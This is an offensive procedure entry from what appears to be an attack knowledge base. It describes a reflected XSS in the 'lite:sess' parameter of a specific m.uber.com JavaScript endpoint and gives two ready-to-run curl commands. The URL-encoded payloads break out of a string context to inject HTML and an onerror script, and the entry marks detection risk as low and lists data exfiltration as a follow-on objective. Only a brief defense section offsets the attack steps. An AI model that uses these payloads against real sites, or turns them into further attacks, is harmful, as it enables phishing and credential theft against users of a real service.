---
tags:
  - xss
  - reflected-xss
  - javascript-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-inject-xss-payload]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 69256005-2e7f-4ef8-8bc5-d1a543a7839a
created_at: '2025-12-14T03:15:36.364Z'
updated_at: '2025-12-14T03:15:36.364Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Reflected-XSS-via-lite-sess

## Summary

This procedure exploits a reflected XSS vulnerability in the 'lite:sess' query parameter of Uber's mobile JavaScript endpoint by injecting a payload that breaks out of a double-quoted string context, allowing arbitrary JavaScript and HTML execution in the victim's browser.

## Description

The endpoint https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js directly inserts user input from 'lite:sess' into a JavaScript string without escaping. By closing the string with a double quote and injecting <script> or HTML tags, attackers can execute code upon page load. This leads to potential credential theft or phishing in an SSL-protected context. The attack targets mobile users accessing the endpoint, with no authentication required.

## Requirements

1. Network access to https://m.uber.com
2. Ability to craft and send HTTP GET requests (e.g., via curl or browser)
3. Victim interaction: The endpoint must be loaded in a browser for execution

## Defense

Defensive measures and detection strategies:

- Sanitize and escape user input in JavaScript contexts using proper encoding (e.g., JSON.stringify or HTML entity encoding)
- Implement Content Security Policy (CSP) with strict script-src directives to block inline and untrusted scripts
- Monitor for anomalous query parameters in logs and use WAF rules to detect common XSS payloads like "></script>"

## Objectives

1. Break out of the JavaScript string to inject executable code
2. Render injected HTML elements in the browser
3. Enable follow-on attacks like data exfiltration

## Instructions

### Step 1: Craft the Payload

**Context**: Analyze the endpoint response to identify the string insertion point, then craft a payload using double quotes to close the string and inject tags.

**Command** ([[commands/curl-inject-xss-payload]]):
```bash
curl "https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?lite:sess=%22%7D}%22</script><div%20class%3D%27_b%20_c%20_d%20_e%20_f%20_g%20_h%20_i%20_a3%20_a4%20_a5%20_a6%20_a7%20_a8%20_a9%20_aa%20_ab%20_ac%20_ad%20_ae%20_af%20_ag%20_ah%20_ai%20_aj%20_ak%20_al%20_am%20_an%20_ao%20_ap%20_aq%20_ar%20_as%20_at%20_au%20_av%20_aw%27><a%20href%3D\"http%3A//www.lyft.com\">Some%20arbitrary%20link%20text</a></div>"
```

> This command sends the payload, which URL-encodes the breakout sequence. Expected output includes the reflected payload in the JS response, confirming injection.

### Step 2: Verify Execution

**Context**: Load the endpoint in a browser to observe rendering and execution of the injected elements.

**Command** ([[commands/curl-inject-xss-payload]]):
```bash
curl -v "https://m.uber.com/0-dfffb25d2cf6ceeb0a27.js?lite:sess=%22%7D}%22</script><img%20src%3Dx%20onerror%3Dalert('XSS')>"
```

> Replace with a browser visit or proxy the request. Expected output: Alert box pops up or injected div renders, indicating successful execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-xss-payload]]

## Tools Used


## Tags

- [[xss]]
- [[reflected-xss]]
